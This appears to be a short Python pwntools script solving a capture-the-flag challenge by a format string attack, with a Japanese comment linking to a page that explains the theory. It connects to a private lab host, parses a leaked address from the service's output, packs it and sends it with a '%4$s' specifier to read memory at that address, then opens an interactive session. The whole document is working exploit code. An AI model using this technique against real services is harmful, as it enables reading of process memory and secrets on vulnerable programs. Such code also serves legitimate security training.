# String format attack 
# 理論がわかりやすいサイト↓
# https://inaz2.hatenablog.com/entry/2014/04/20/022809 
from pwn import *

io = remote("10.1.1.10",13030)
io.recvuntil("flag")
txt = io.recvline()
txt = str(txt)
start = txt.find("[")
end = txt.find("]")

address = txt[start+3:end]
address = struct.pack('<I',int(address,16))

shell = address + b'%4$s'

io.sendline(shell)
io.interactive()